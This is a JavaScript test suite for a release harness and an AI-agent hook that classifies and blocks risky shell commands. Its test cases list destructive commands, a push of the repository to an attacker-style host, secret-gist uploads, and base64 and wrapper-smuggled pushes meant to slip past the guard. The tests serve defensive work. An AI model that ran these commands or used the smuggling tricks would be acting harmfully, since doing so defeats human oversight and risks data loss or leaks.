'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { spawnSync } = require('node:child_process');

const core = require('../scripts/release/release-core.cjs');
const cli = require('../scripts/release/release.cjs');
const guard = require('../.claude/hooks/release-guard.cjs');

const ROOT = path.resolve(__dirname, '..');
const HEAD = 'a'.repeat(40);
const APPROVAL_SUFFIX = 'release/approvals/B1.approval.json';
const EVIDENCE_SUFFIX = 'release/verification/B1.evidence.json';

function realBacklog() {
  return JSON.parse(fs.readFileSync(path.join(ROOT, 'release', 'backlog.json'), 'utf8'));
}

function evidenceFor(taskId, overrides = {}) {
  const task = core.validateBacklog(realBacklog()).tasks.find(entry => entry.id === taskId);
  return JSON.stringify({
    schemaVersion: 1,
    taskId,
    headSha: HEAD,
    recordedAt: '2026-08-05T00:00:00.000Z',
    criteria: task.acceptanceCriteria.map(criterion => ({
      id: criterion.id, status: 'passed', exitCode: 0, command: criterion.command, detail: 'observed in this run'
    })),
    ...overrides
  });
}

function approvalFor(taskId, overrides = {}) {
  return JSON.stringify({
    schemaVersion: 1,
    taskId,
    approvedBy: 'Operator',
    approvedAt: '2026-08-05T00:00:00.000Z',
    scope: 'Apply the storage and proof migrations to the test project.',
    headSha: HEAD,
    ...overrides
  });
}

// A git stand-in: the simulation must never depend on the checkout it happens
// to run in, and the ledger assertions must be about the harness, not the repo.
function gitStub(recorded) {
  return (file, args) => {
    const command = [file, ...args].join(' ');
    if (recorded) recorded.push(command);
    if (command.startsWith('git branch')) return { status: 0, stdout: 'feat/release-harness\n', stderr: '', error: null };
    if (command.startsWith('git rev-parse')) return { status: 0, stdout: `${HEAD}\n`, stderr: '', error: null };
    if (command.startsWith('git status')) return { status: 0, stdout: '', stderr: '', error: null };
    return { status: 1, stdout: '', stderr: `unexpected command: ${command}`, error: null };
  };
}

function fsStub(overrides = {}) {
  return {
    readFileSync(target, encoding) {
      const normalized = String(target).replace(/\\/g, '/');
      for (const [suffix, value] of Object.entries(overrides)) {
        if (normalized.endsWith(suffix)) {
          if (value === null) {
            const error = new Error(`ENOENT: ${suffix}`);
            error.code = 'ENOENT';
            throw error;
          }
          return value;
        }
      }
      return fs.readFileSync(target, encoding);
    }
  };
}

function simulate(overrides = {}) {
  const recorded = [];
  const execution = core.runRelease({ mode: 'simulate' }, {
    repositoryRoot: ROOT,
    runCommand: gitStub(recorded),
    now: () => new Date('2026-08-05T00:00:00.000Z'),
    fs: overrides.fs || fsStub(),
    ...overrides.deps
  });
  return { execution, recorded };
}

/* ==================== backlog validation ==================== */

test('the committed backlog validates', () => {
  const backlog = core.validateBacklog(realBacklog());
  assert.equal(backlog.schemaVersion, core.SCHEMA_VERSION);
  assert.ok(backlog.tasks.length >= 8);
  for (const task of backlog.tasks) assert.ok(task.evidence.length > 0, `${task.id} cites no evidence`);
});

test('backlog validation refuses structural defects', () => {
  const cases = [
    ['BACKLOG_SCHEMA_UNSUPPORTED', backlog => { backlog.schemaVersion = 99; }],
    ['BACKLOG_EMPTY', backlog => { backlog.tasks = []; }],
    ['BACKLOG_TASK_DUPLICATE', backlog => { backlog.tasks.push({ ...backlog.tasks[0], rank: 99 }); }],
    ['BACKLOG_RANK_DUPLICATE', backlog => { backlog.tasks[1].rank = backlog.tasks[0].rank; }],
    ['BACKLOG_DEPENDENCY_UNKNOWN', backlog => { backlog.tasks[0].dependsOn = ['NOPE']; }],
    ['BACKLOG_TASK_EVIDENCE_MISSING', backlog => { backlog.tasks[0].evidence = []; }],
    ['BACKLOG_TASK_SEVERITY_INVALID', backlog => { backlog.tasks[0].severity = 'urgent'; }],
    ['BACKLOG_TASK_DECISION_INVALID', backlog => { backlog.tasks[0].decision = 'maybe'; }],
    ['BACKLOG_TASK_SELF_DEPENDENCY', backlog => { backlog.tasks[0].dependsOn = [backlog.tasks[0].id]; }]
  ];
  for (const [code, mutate] of cases) {
    const backlog = realBacklog();
    mutate(backlog);
    assert.throws(() => core.validateBacklog(backlog), error => error.code === code, `expected ${code}`);
  }
});

test('backlog validation refuses a dependency cycle', () => {
  const backlog = realBacklog();
  backlog.tasks[0].dependsOn = [backlog.tasks[1].id];
  backlog.tasks[1].dependsOn = [backlog.tasks[0].id];
  assert.throws(() => core.validateBacklog(backlog), error => error.code === 'BACKLOG_DEPENDENCY_CYCLE');
});

/* ==================== selection ==================== */

test('the harness selects B1 as the next task', () => {
  const selection = core.selectNextTask(core.validateBacklog(realBacklog()));
  assert.equal(selection.selectionCode, 'SELECTED');
  assert.equal(selection.selected.id, 'B1');
  assert.equal(selection.selected.severity, 'P1');
  assert.equal(selection.selected.workaround, null);
  assert.deepEqual(selection.rankedIds, ['B1', 'B2', 'B7', 'M-2B2']);
});

test('B1 and B2 are scheduled for verification, not for a second implementation', () => {
  const backlog = core.validateBacklog(realBacklog());
  const selection = core.selectNextTask(backlog);
  assert.equal(selection.operation, 'verify');
  for (const id of ['B1', 'B2']) {
    const task = backlog.tasks.find(entry => entry.id === id);
    assert.equal(task.status, 'in-review', `${id} must be in review, not open`);
    assert.ok(task.implementation.commits.length > 0, `${id} must record its implementation commits`);
    assert.equal(task.implementation.merged, false);
    assert.ok(task.acceptanceCriteria.length >= 3, `${id} must state acceptance criteria`);
    assert.equal(core.nextOperation(task), 'verify');
  }
});

test('a task whose implementation exists but is still marked open is a state defect', () => {
  const backlog = realBacklog();
  const b1 = backlog.tasks.find(task => task.id === 'B1');
  b1.status = 'open';
  assert.equal(core.nextOperation(core.validateBacklog(backlog).tasks.find(task => task.id === 'B1')), 'reconcile-state');

  const { execution } = simulate({ fs: fsStub({ 'release/backlog.json': JSON.stringify(backlog) }) });
  assert.equal(execution.exitCode, core.EXIT_BLOCKED);
  assert.equal(execution.result.failureCode, 'TASK_STATE_STALE');
  assert.equal(execution.result.productionActionsExecuted, 0);
});

test('a task cannot claim review status without an implementation and criteria', () => {
  const withoutCommits = realBacklog();
  withoutCommits.tasks.find(task => task.id === 'B1').implementation = { commits: [], branch: '', merged: false };
  assert.throws(() => core.validateBacklog(withoutCommits), error => error.code === 'BACKLOG_TASK_REVIEW_WITHOUT_IMPLEMENTATION');

  const withoutCriteria = realBacklog();
  withoutCriteria.tasks.find(task => task.id === 'B1').acceptanceCriteria = [];
  assert.throws(() => core.validateBacklog(withoutCriteria), error => error.code === 'BACKLOG_TASK_REVIEW_WITHOUT_CRITERIA');
});

test('the untracked supabase/snippets directory is not a release task', () => {
  const backlog = core.validateBacklog(realBacklog());
  const selection = core.selectNextTask(backlog);
  const nonTaskPaths = backlog.nonTasks.map(entry => entry.path);
  assert.ok(nonTaskPaths.includes('supabase/snippets/'), 'snippets must be recorded as an explicit non-task');
  for (const entry of backlog.nonTasks) assert.ok(entry.reason.trim(), `${entry.path} needs a recorded reason`);
  for (const task of selection.ordered) {
    assert.equal(/snippet/i.test(`${task.id} ${task.title}`), false, `${task.id} treats snippets as work`);
  }
  // B8 records the owner decision about them, and it is excluded, not selected.
  const excluded = new Map(selection.excluded.map(entry => [entry.id, entry.code]));
  assert.equal(excluded.get('B8'), 'DECISION_PENDING');
});

test('the selection does not depend on the order the backlog lists tasks in', () => {
  const reference = core.selectNextTask(core.validateBacklog(realBacklog()));
  // Every rotation, plus a reversal: a stable answer under all of them cannot
  // be an artefact of input order.
  for (let offset = 0; offset < reference.ordered.length + reference.excluded.length; offset += 1) {
    const backlog = realBacklog();
    backlog.tasks = backlog.tasks.slice(offset).concat(backlog.tasks.slice(0, offset));
    const selection = core.selectNextTask(core.validateBacklog(backlog));
    assert.equal(selection.selected.id, 'B1', `rotation ${offset} changed the selection`);
    assert.deepEqual(selection.rankedIds, reference.rankedIds);
  }
  const reversed = realBacklog();
  reversed.tasks.reverse();
  const selection = core.selectNextTask(core.validateBacklog(reversed));
  assert.equal(selection.selected.id, 'B1');
  assert.deepEqual(selection.rankedIds, reference.rankedIds);
});

test('every excluded task carries a reason code', () => {
  const selection = core.selectNextTask(core.validateBacklog(realBacklog()));
  const byId = new Map(selection.excluded.map(entry => [entry.id, entry.code]));
  // B3 was resolved in 19c4c4b — the staging project exists and is linked — so
  // it is excluded as already done, not as a pending external dependency.
  assert.equal(byId.get('B3'), 'ALREADY_DONE');
  assert.equal(byId.get('B4'), 'EXTERNAL_DEPENDENCY');
  assert.equal(byId.get('B5'), 'DEPENDENCY_NOT_DONE');
  assert.equal(byId.get('B6'), 'DECISION_PENDING');
  assert.equal(byId.get('B8'), 'DECISION_PENDING');
  for (const entry of selection.excluded) assert.ok(entry.detail.trim(), `${entry.id} has no detail`);
});

test('severity outranks rank, and a workaround outranks rank', () => {
  const template = core.validateBacklog(realBacklog()).tasks[0];
  const make = (id, rank, severity, workaround) => ({
    ...template, id, rank, severity, workaround, dependsOn: [], status: 'open', decision: 'approved',
    actionability: 'internal', evidence: ['synthetic'], title: id
  });
  const severityFirst = core.selectNextTask(core.validateBacklog({
    schemaVersion: 1, tasks: [make('LOW', 1, 'P2', null), make('HIGH', 9, 'P1', null)]
  }));
  assert.equal(severityFirst.selected.id, 'HIGH');
  const workaroundFirst = core.selectNextTask(core.validateBacklog({
    schemaVersion: 1, tasks: [make('HASWORK', 1, 'P1', 'documented elsewhere'), make('NOWORK', 9, 'P1', null)]
  }));
  assert.equal(workaroundFirst.selected.id, 'NOWORK');
});

test('a backlog with nothing eligible selects nothing rather than guessing', () => {
  const backlog = realBacklog();
  for (const task of backlog.tasks) task.decision = 'pending';
  const selection = core.selectNextTask(core.validateBacklog(backlog));
  assert.equal(selection.selected, null);
  assert.equal(selection.selectionCode, 'NO_ELIGIBLE_TASK');
});

/* ==================== command classification ==================== */

test('production commands are classified as production', () => {
  const production = [
    'git push origin main',
    'git push --force origin feat/x',
    'git -C /repo push',
    'git tag -a v1.2.0 -m v1.2.0',
    'gh release create v1.2.0',
    'gh pr merge 30 --admin',
    'gh pr merge 30 --squash --merge',
    'gh pr merge 30',
    'gh pr close 30',
    'gh run rerun 12345',
    'gh workflow run release.yml',
    'gh api -X POST /repos/o/r/releases',
    'supabase db push',
    'npx supabase db push',
    'npx.cmd supabase functions deploy team-management',
    'supabase link --project-ref hywpwutykwrxkddnofrh',
    'supabase link',
    'supabase login',
    'supabase secrets set FOO=bar',
    'supabase projects create some-other-name --org-id iivhkhxodnoypvfeucob --db-password x --region eu-west-3',
    'supabase projects create dashboard-latam-staging --org-id some-other-org --db-password x --region eu-west-3',
    'supabase projects create dashboard-latam-staging --org-id iivhkhxodnoypvfeucob --db-password x --region eu-west-3 --plan pro',
    'supabase projects delete abcdefghijklmnopqrst',
    'supabase projects pause abcdefghijklmnopqrst',
    'supabase projects restore abcdefghijklmnopqrst',
    'npm publish',
    'docker push registry/image:tag',
    'vercel --prod',
    'netlify deploy --prod',
    'wrangler deploy',
    'aws s3 sync artifacts/pages-site s3://bucket',
    'kubectl apply -f deploy.yaml',
    'terraform apply -auto-approve'
  ];
  for (const command of production) {
    assert.equal(core.classifyCommand(command).classification, core.PRODUCTION, command);
  }
});

test('wrappers do not hide a production command', () => {
  const wrapped = [
    'powershell -NoProfile -ExecutionPolicy Bypass -Command "npx supabase db push"',
    'powershell.exe -NoProfile -Command \'git push origin main\'',
    'cmd /c "npm publish"',
    'bash -c "gh release create v1"',
    'sh -c "git push"',
    'sudo git push',
    'env GIT_SSH_COMMAND=ssh git push',
    'CI=1 npm publish',
    'npm test && git push',
    'npm test; supabase db push',
    'git status | git push',
    '"C:\\Program Files\\Git\\cmd\\git.exe" push',
    'C:\\tools\\git.exe push',
    '/usr/bin/git push'
  ];
  for (const command of wrapped) {
    assert.equal(core.classifyCommand(command).classification, core.PRODUCTION, command);
  }
});

test('a wrapper payload is classified by all of its commands, not just the first', () => {
  // The hole this closes: unwrapping returned only the first segment of a
  // quoted payload, so anything after `&&`, `;`, `|` or `&` was never seen and
  // `bash -c "npm test && git push"` classified as read-only.
  const smuggled = [
    'sh -c "npm test && git push"',
    'bash -c "git status && git push origin main"',
    'bash -c "echo start; supabase db push"',
    'powershell -NoProfile -Command "npm test; supabase db push"',
    'cmd /c "type file.txt & supabase functions deploy team-management"',
    'cmd /c "echo hi & npm publish"',
    'bash -c "ls; npm run check:js; gh release create v1"',
    'powershell -Command "& {git push}"',
    'cd repo && git push'
  ];
  for (const command of smuggled) {
    const outcome = core.classifyCommand(command);
    assert.equal(outcome.classification, core.PRODUCTION, `${command} => ${outcome.classification} (${outcome.rule})`);
    assert.equal(guard.evaluate(bashEvent(command), {}).decision, 'deny', command);
  }
  assert.equal(core.classifyCommand('bash -c "ls && rm -rf ."').classification, core.DESTRUCTIVE);
});

test('a wrapped command the classifier cannot resolve is refused, not waved through', () => {
  // Refusing every unknown command would make the guard unusable, so unknown
  // is allowed in general — but not when it is hiding inside a shell wrapper
  // or an encoded payload, which is the shape of a smuggling attempt.
  for (const command of [
    'bash -c "bash -c \\"git push\\""',
    'sh -c "$(printf %s Z2l0IHB1c2g= | base64 -d)"',
    'powershell -EncodedCommand ZwBpAHQAIABwAHUAcwBoAA=='
  ]) {
    assert.equal(guard.evaluate(bashEvent(command), {}).decision, 'deny', command);
  }
  // A plain unrecognised command stays allowed.
  assert.equal(core.classifyCommand('curl https://example.com').classification, core.UNKNOWN);
  assert.equal(guard.evaluate(bashEvent('curl https://example.com'), {}).decision, 'defer');
});

test('a global flag and its value are not mistaken for the subcommand', () => {
  const disguised = [
    ['npx --yes supabase db push', core.PRODUCTION],
    ['npx -y supabase db push', core.PRODUCTION],
    ['supabase --workdir . db push', core.PRODUCTION],
    ['npm --prefix . publish', core.PRODUCTION],
    ['sudo -u root git push', core.PRODUCTION],
    ['nice -n 10 git push', core.PRODUCTION],
    ['terraform -chdir=. apply', core.PRODUCTION],
    ['docker image push registry/x', core.PRODUCTION],
    ['gh api --method=DELETE /repos/o/r', core.PRODUCTION],
    ['gh api --method DELETE /repos/o/r', core.PRODUCTION],
    ['gh auth login', core.PRODUCTION],
    ['gh repo create foo --public', core.PRODUCTION],
    ['gh gist create secrets.txt', core.PRODUCTION]
  ];
  for (const [command, expected] of disguised) {
    const outcome = core.classifyCommand(command);
    assert.equal(outcome.classification, expected, `${command} => ${outcome.classification} (${outcome.rule})`);
  }
  // Reads through the same flag shapes stay read-only.
  assert.equal(core.classifyCommand('gh api /repos/o/r').classification, core.READ_ONLY);
  assert.equal(core.classifyCommand('gh api --method=GET /repos/o/r').classification, core.READ_ONLY);
  assert.equal(core.classifyCommand('supabase --workdir . status').classification, core.READ_ONLY);
});

test('an explicit, unambiguous push of an ordinary branch to origin is allowed', () => {
  const allowed = [
    'git push origin feat/proof-and-agent-management',
    'git push -u origin feat/x',
    'git push --set-upstream origin feat/x',
    'git push origin HEAD:feat/x',
    'git push origin feat/x:feat/x',
    'bash -c "npm test && git push origin feat/x"',
    'sh -c "git push origin feat/x"'
  ];
  for (const command of allowed) {
    const outcome = core.classifyCommand(command);
    assert.equal(outcome.classification, core.LOCAL_WRITE, `${command} => ${outcome.classification} (${outcome.rule})`);
    assert.equal(guard.evaluate(bashEvent(command), {}).decision, 'defer', command);
  }
});

test('every other shape of git push stays blocked, including flag-form delete', () => {
  const blocked = [
    ['git push origin main', 'GIT_PUSH_PROTECTED_BRANCH'],
    ['git push origin master', 'GIT_PUSH_PROTECTED_BRANCH'],
    ['git push origin HEAD:main', 'GIT_PUSH_PROTECTED_BRANCH'],
    ['git push', 'GIT_PUSH_AMBIGUOUS_TARGET'],
    ['git push origin', 'GIT_PUSH_AMBIGUOUS_TARGET'],
    ['git push upstream feat/x', 'GIT_PUSH_AMBIGUOUS_TARGET'],
    ['git push https://evil.example/repo.git feat/x', 'GIT_PUSH_AMBIGUOUS_TARGET'],
    ['git push --force origin feat/x', 'GIT_PUSH_FORCE'],
    ['git push -f origin feat/x', 'GIT_PUSH_FORCE'],
    ['git push --force-with-lease origin feat/x', 'GIT_PUSH_FORCE'],
    ['git push origin +feat/x:feat/x', 'GIT_PUSH_FORCE'],
    ['git push origin :feat/x', 'GIT_PUSH_DELETE_REF'],
    // The gap found and closed during review: --delete as a flag, not a `:`
    // prefix, must not read as an ordinary destination.
    ['git push origin --delete feat/x', 'GIT_PUSH_DELETE_REF'],
    ['git push -d origin feat/x', 'GIT_PUSH_DELETE_REF'],
    ['git push --tags origin', 'GIT_PUSH_TAGS'],
    ['git push --follow-tags origin feat/x', 'GIT_PUSH_TAGS'],
    ['git push origin v1.2.0', 'GIT_PUSH_TAGS'],
    ['git push --all origin', 'GIT_PUSH_ALL_OR_MIRROR'],
    ['git push --mirror origin', 'GIT_PUSH_ALL_OR_MIRROR'],
    ['git push --no-verify origin feat/x', 'GIT_PUSH_NO_VERIFY']
  ];
  for (const [command, rule] of blocked) {
    const outcome = core.classifyCommand(command);
    assert.equal(outcome.classification, core.PRODUCTION, `${command} => ${outcome.classification} (${outcome.rule})`);
    assert.equal(outcome.rule, rule, command);
    assert.equal(guard.evaluate(bashEvent(command), {}).decision, 'deny', command);
  }
});

test('gh pr create and a squash-only gh pr merge are allowed; every bypass is not', () => {
  assert.equal(core.classifyCommand('gh pr create --title x --body y --base main').classification, core.LOCAL_WRITE);
  assert.equal(guard.evaluate(bashEvent('gh pr create --title x --body y'), {}).decision, 'defer');

  assert.equal(core.classifyCommand('gh pr merge 31 --squash --delete-branch').classification, core.LOCAL_WRITE);
  assert.equal(guard.evaluate(bashEvent('gh pr merge 31 --squash'), {}).decision, 'defer');

  const blocked = [
    'gh pr merge 31',
    'gh pr merge 31 --squash --admin',
    'gh pr merge 31 --squash --force',
    'gh pr merge 31 --merge',
    'gh pr merge 31 --rebase',
    'gh pr close 31',
    'gh pr edit 31 --title x',
    'gh pr review 31 --approve'
  ];
  for (const command of blocked) {
    assert.equal(core.classifyCommand(command).classification, core.PRODUCTION, command);
    assert.equal(guard.evaluate(bashEvent(command), {}).decision, 'deny', command);
  }
});

test('PR status checks and CI monitoring are read-only; re-running or cancelling a run is not', () => {
  const readOnly = ['gh pr checks 31', 'gh pr status', 'gh pr view 31', 'gh pr list', 'gh run list', 'gh run view 12345', 'gh run watch 12345'];
  for (const command of readOnly) {
    assert.equal(core.classifyCommand(command).classification, core.READ_ONLY, command);
    assert.equal(guard.evaluate(bashEvent(command), {}).decision, 'defer', command);
  }
  for (const command of ['gh run rerun 12345', 'gh run cancel 12345', 'gh run delete 12345']) {
    assert.equal(core.classifyCommand(command).classification, core.PRODUCTION, command);
    assert.equal(guard.evaluate(bashEvent(command), {}).decision, 'deny', command);
  }
});

test('creating and linking exactly the named staging project is allowed; nothing else is', () => {
  const allowed = [
    'supabase projects create dashboard-latam-staging --org-id iivhkhxodnoypvfeucob --db-password x --region eu-west-3',
    'supabase projects create dashboard-latam-staging --org-id=iivhkhxodnoypvfeucob --db-password x --region eu-west-3',
    'supabase projects create dashboard-latam-staging --org-id iivhkhxodnoypvfeucob',
    'supabase link --project-ref abcdefghijklmnopqrst',
    'supabase link -p abcdefghijklmnopqrst'
  ];
  for (const command of allowed) {
    const outcome = core.classifyCommand(command);
    assert.equal(outcome.classification, core.LOCAL_WRITE, `${command} => ${outcome.classification} (${outcome.rule})`);
    assert.equal(guard.evaluate(bashEvent(command), {}).decision, 'defer', command);
  }

  const stillBlocked = [
    ['supabase projects create not-staging --org-id iivhkhxodnoypvfeucob --db-password x --region eu-west-3', 'SUPABASE_PROJECT_CREATE_NAME_MISMATCH'],
    ['supabase projects create dashboard-latam-staging --org-id wrong-org --db-password x --region eu-west-3', 'SUPABASE_PROJECT_CREATE_ORG_MISMATCH'],
    ['supabase projects create dashboard-latam-staging --org-id iivhkhxodnoypvfeucob --db-password x --region eu-west-3 --plan pro', 'SUPABASE_PROJECT_CREATE_DISALLOWED_FLAG'],
    ['supabase projects create dashboard-latam-staging --org-id iivhkhxodnoypvfeucob --db-password x --region eu-west-3 --size small', 'SUPABASE_PROJECT_CREATE_DISALLOWED_FLAG'],
    ['supabase projects create dashboard-latam-staging --org-id iivhkhxodnoypvfeucob --db-password x --region eu-west-3 --custom-domain x.com', 'SUPABASE_PROJECT_CREATE_DISALLOWED_FLAG'],
    ['supabase projects create hywpwutykwrxkddnofrh --org-id iivhkhxodnoypvfeucob --db-password x --region eu-west-3', 'SUPABASE_PROJECT_CREATE_NAME_MISMATCH'],
    ['supabase link --project-ref hywpwutykwrxkddnofrh', 'SUPABASE_LINK_EXISTING_PROJECT_BLOCKED'],
    ['supabase link -p hywpwutykwrxkddnofrh', 'SUPABASE_LINK_EXISTING_PROJECT_BLOCKED'],
    ['supabase link', 'SUPABASE_LINK_AMBIGUOUS_TARGET'],
    ['supabase projects delete abcdefghijklmnopqrst', 'SUPABASE_PROJECT_MUTATION'],
    ['supabase projects pause abcdefghijklmnopqrst', 'SUPABASE_PROJECT_MUTATION'],
    ['supabase projects restore abcdefghijklmnopqrst', 'SUPABASE_PROJECT_MUTATION'],
    ['supabase projects transfer abcdefghijklmnopqrst', 'SUPABASE_PROJECT_MUTATION'],
    ['supabase login', 'SUPABASE_PROJECT_AUTHORITY'],
    ['supabase db reset --linked', null]
  ];
  for (const [command, rule] of stillBlocked) {
    const outcome = core.classifyCommand(command);
    assert.notEqual(outcome.classification, core.LOCAL_WRITE, `${command} was wrongly allowed`);
    assert.notEqual(outcome.classification, core.READ_ONLY, `${command} was wrongly allowed`);
    if (rule) assert.equal(outcome.rule, rule, command);
    assert.equal(guard.evaluate(bashEvent(command), {}).decision, 'deny', command);
  }

  // --help never creates anything; it prints usage.
  for (const command of ['supabase projects create --help', 'supabase link --help', 'supabase projects create -h']) {
    assert.equal(core.classifyCommand(command).classification, core.READ_ONLY, command);
    assert.equal(guard.evaluate(bashEvent(command), {}).decision, 'defer', command);
  }

  // A wrapper does not widen or narrow the exception.
  assert.equal(core.classifyCommand('bash -c "supabase projects create dashboard-latam-staging --org-id iivhkhxodnoypvfeucob --db-password x --region eu-west-3"').classification, core.LOCAL_WRITE);
  assert.equal(core.classifyCommand('bash -c "supabase link --project-ref hywpwutykwrxkddnofrh"').classification, core.PRODUCTION);
});

test('an approval record cannot be reached through a wrapped or indirect shell command', () => {
  const attempts = [
    'bash -c "ls && rm release/approvals/B1.approval.json"',
    'bash -c "echo hi; sed -i s/a/b/ release/approvals/B1.approval.json"',
    'rm release/approvals/B1.approval.json',
    'sed -i "s/x/y/" release/approvals/B1.approval.json',
    'cmd /c "copy nul release\\approvals\\B1.approval.json"',
    'sh -c "truncate -s 0 release/approvals/B1.approval.json"'
  ];
  for (const command of attempts) {
    for (const env of [{}, { RELEASE_HARNESS_MODE: 'simulate' }]) {
      assert.equal(guard.evaluate(bashEvent(command), env).decision, 'deny', command);
    }
  }
});

test('MultiEdit content is scanned like every other write', () => {
  const secret = 'sb_' + 'secret_abcdefghijklmnop';
  const multi = (file, newString) => ({
    hook_event_name: 'PreToolUse',
    tool_name: 'MultiEdit',
    tool_input: { file_path: file, edits: [{ old_string: 'x', new_string: newString }] }
  });
  assert.equal(guard.evaluate(multi('src/config.js', `const k = "${secret}";`), {}).decision, 'deny');
  assert.equal(guard.evaluate(multi('supabase/migrations/x.sql', 'alter table t ' + 'disable row level security;'), {}).decision, 'deny');
  assert.equal(guard.evaluate(multi('docs/notes.md', 'ordinary prose'), {}).decision, 'defer');
});

test('destructive commands are classified as destructive', () => {
  for (const command of [
    'git reset --hard origin/main',
    'git clean -fdx',
    'git filter-branch --tree-filter true',
    'supabase db reset',
    'npx supabase db reset',
    'npm run smoke',
    'npm run verify:runtime -- --allow-reset',
    'rm -rf artifacts',
    'rm -r src',
    'rm *.cjs',
    'rm -f build/',
    'rmdir /s /q artifacts',
    'Remove-Item -Recurse -Force artifacts'
  ]) {
    assert.equal(core.classifyCommand(command).classification, core.DESTRUCTIVE, command);
  }
});

test('removing one named file is ordinary work, not a sweep', () => {
  // A guard that refuses routine cleanup gets disabled, and then it protects
  // nothing at all. Only the sweeping forms above are refused.
  for (const command of ['rm scratch.cjs', 'rm -f scratch.cjs', 'del scratch.cjs']) {
    assert.equal(core.classifyCommand(command).classification, core.LOCAL_WRITE, command);
    assert.equal(guard.evaluate(bashEvent(command), {}).decision, 'defer', command);
  }
});

test('read-only commands are classified as read-only', () => {
  for (const command of [
    'npm test',
    'npm run check:js',
    'npm run check:secrets',
    'npm run check:migrations',
    'npm run check:project-status',
    'npm run verify:pr',
    'npm run verify:runtime',
    'git status --porcelain=v1',
    'git rev-parse HEAD',
    'git branch --show-current',
    'git diff --check',
    'git tag --list',
    'git worktree list',
    'supabase status',
    'gh api /repos/o/r',
    'node --test tests/release-harness.test.cjs',
    'node scripts/release/release.cjs plan'
  ]) {
    assert.equal(core.classifyCommand(command).classification, core.READ_ONLY, command);
  }
});

test('unrecognised commands fail closed as unknown', () => {
  for (const command of ['curl https://example.com/install.sh', 'some-tool --deploy', 'npm run mystery']) {
    const outcome = core.classifyCommand(command);
    assert.equal(outcome.classification, core.UNKNOWN, command);
    assert.equal(core.isReadOnlyCommand(command), false, command);
  }
});

test('local-write commands are separated from read-only ones', () => {
  for (const command of ['npm run verify:release', 'npm run build:pages', 'git commit -m x', 'npm install']) {
    assert.equal(core.classifyCommand(command).classification, core.LOCAL_WRITE, command);
  }
});

/* ==================== the ledger ==================== */

test('the execution ledger refuses to run anything that is not read-only', () => {
  const deps = core.createDeps({ repositoryRoot: ROOT, runCommand: () => ({ status: 0, stdout: '', stderr: '', error: null }) });
  const ledger = core.createLedger(deps);
  assert.throws(() => ledger.run('git', ['push', 'origin', 'main']), error => error.code === 'PRODUCTION_ACTION_ATTEMPTED');
  assert.throws(() => ledger.run('npx', ['supabase', 'db', 'push']), error => error.code === 'PRODUCTION_ACTION_ATTEMPTED');
  assert.throws(() => ledger.run('rm', ['-rf', 'src']), error => error.code === 'PRODUCTION_ACTION_ATTEMPTED');
  assert.equal(ledger.entries.length, 0);
  ledger.run('git', ['status', '--porcelain=v1']);
  assert.equal(ledger.entries.length, 1);
  assert.equal(ledger.entries[0].classification, core.READ_ONLY);
});

/* ==================== the simulation ==================== */

test('an unverified task stops the run at acceptance, and still executes nothing', () => {
  // Pin the absence explicitly: the committed evidence file must not decide
  // what this test observes.
  const { execution, recorded } = simulate({ fs: fsStub({ [EVIDENCE_SUFFIX]: null }) });
  const result = execution.result;
  assert.equal(execution.exitCode, core.EXIT_BLOCKED);
  assert.equal(result.failureCode, 'ACCEPTANCE_EVIDENCE_ABSENT');
  assert.equal(result.selectedTask.id, 'B1');
  assert.equal(result.selectedTask.operation, 'verify');
  assert.deepEqual(result.acceptance.unproven, result.selectedTask.acceptanceCriteria.map(criterion => criterion.id));

  const gates = new Map(result.gates.map(gate => [gate.id, gate]));
  assert.equal(gates.get('G5b-acceptance').status, core.STATUS_BLOCKED);
  // The production gate still reports, and still refuses.
  assert.equal(gates.get('G7-production').status, core.STATUS_HALTED);
  assert.equal(result.productionActionsExecuted, 0);
  for (const command of recorded) assert.equal(core.isReadOnlyCommand(command), true, command);
});

test('a verified task reaches the production gate and halts there', () => {
  const { execution, recorded } = simulate({ fs: fsStub({ [EVIDENCE_SUFFIX]: evidenceFor('B1') }) });
  const result = execution.result;
  assert.equal(execution.exitCode, core.EXIT_HALTED);
  assert.equal(result.status, core.STATUS_HALTED);
  assert.equal(result.failureCode, 'HALTED_AT_PRODUCTION_GATE');
  assert.equal(result.haltedAtGate, 'G7-production');
  assert.equal(result.acceptance.verified, true);

  const gates = new Map(result.gates.map(gate => [gate.id, gate]));
  assert.equal(gates.get('G0-context').status, core.STATUS_PASSED);
  assert.equal(gates.get('G1-backlog').status, core.STATUS_PASSED);
  assert.equal(gates.get('G2-documents').status, core.STATUS_PASSED);
  assert.equal(gates.get('G3-static').status, core.STATUS_PLANNED);
  assert.equal(gates.get('G5b-acceptance').status, core.STATUS_PASSED);
  assert.equal(gates.get('G6-approval').status, core.STATUS_BLOCKED);
  assert.equal(gates.get('G7-production').status, core.STATUS_HALTED);

  // The claim under test: nothing but read-only commands ran, and the ledger
  // accounts for every command the harness issued.
  assert.equal(result.productionActionsExecuted, 0);
  assert.equal(result.executedCommands.length, recorded.length);
  for (const entry of result.executedCommands) assert.equal(entry.classification, core.READ_ONLY, entry.command);
  for (const command of recorded) assert.equal(core.isReadOnlyCommand(command), true, command);
  assert.ok(result.refusedProductionActions.length >= 5);
  for (const entry of result.refusedProductionActions) assert.equal(entry.executed, false);
});

test('acceptance evidence is refused when it is stale, partial, or for another task', () => {
  const cases = [
    ['ACCEPTANCE_EVIDENCE_STALE', evidenceFor('B1', { headSha: 'b'.repeat(40) })],
    ['ACCEPTANCE_EVIDENCE_INVALID', evidenceFor('B1', { taskId: 'B2' })],
    ['ACCEPTANCE_EVIDENCE_INVALID', evidenceFor('B1', { schemaVersion: 9 })],
    ['ACCEPTANCE_EVIDENCE_MALFORMED', 'not json'],
    ['ACCEPTANCE_CRITERIA_UNPROVEN', evidenceFor('B1', { criteria: [{ id: 'proof-unit-tests', status: 'passed', exitCode: 0 }] })],
    ['ACCEPTANCE_CRITERIA_UNPROVEN', JSON.parse(evidenceFor('B1')) && evidenceFor('B1', {
      criteria: JSON.parse(evidenceFor('B1')).criteria.map((entry, index) => (index === 0 ? { ...entry, status: 'failed', exitCode: 1 } : entry))
    })]
  ];
  for (const [code, payload] of cases) {
    const { execution } = simulate({ fs: fsStub({ [EVIDENCE_SUFFIX]: payload }) });
    const gate = execution.result.gates.find(entry => entry.id === 'G5b-acceptance');
    assert.equal(gate.failureCode, code, `expected ${code}`);
    assert.equal(execution.exitCode, core.EXIT_BLOCKED);
    assert.equal(execution.result.productionActionsExecuted, 0);
  }
});

test('evidence survives being committed, but not a change to the code it attests to', () => {
  const olderHead = 'c'.repeat(40);
  const evidence = evidenceFor('B1', { headSha: olderHead });

